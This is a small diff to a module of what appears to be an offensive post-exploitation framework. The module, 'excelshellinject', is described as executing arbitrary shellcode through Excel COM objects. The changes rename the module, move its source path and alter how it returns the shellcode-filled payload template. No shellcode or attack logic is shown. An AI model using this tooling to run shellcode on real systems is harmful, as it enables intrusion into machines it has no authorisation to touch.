@@ -5,7 +5,8 @@ from base64 import b64encode
 
 class STModule:
     def __init__(self):
-        self.name = 'excelshellinject'
+        self.name = 'ipy/excelshellinject'
+        self.language = 'ipy'
         self.description = 'Executes arbitrary shellcode using Excel COM objects'
         self.author = '@byt3bl33d3r'
         self.options = {
@@ -17,7 +18,7 @@ class STModule:
         }
 
     def payload(self):
-        with open('modules/src/excelshellinject.py') as module:
+        with open('modules/ipy/src/excelshellinject.py') as module:
             module = module.read()
             shellcode_path = os.path.expanduser(self.options['Shellcode']['Value'])
             if not os.path.exists(shellcode_path):
@@ -25,4 +26,4 @@ class STModule:
 
             with open(shellcode_path, 'r') as shellcode:
                 module = module.replace('~SHELLCODEDECCSV~', convert_shellcode(shellcode.read()))
-                return module.encode()
+                return module
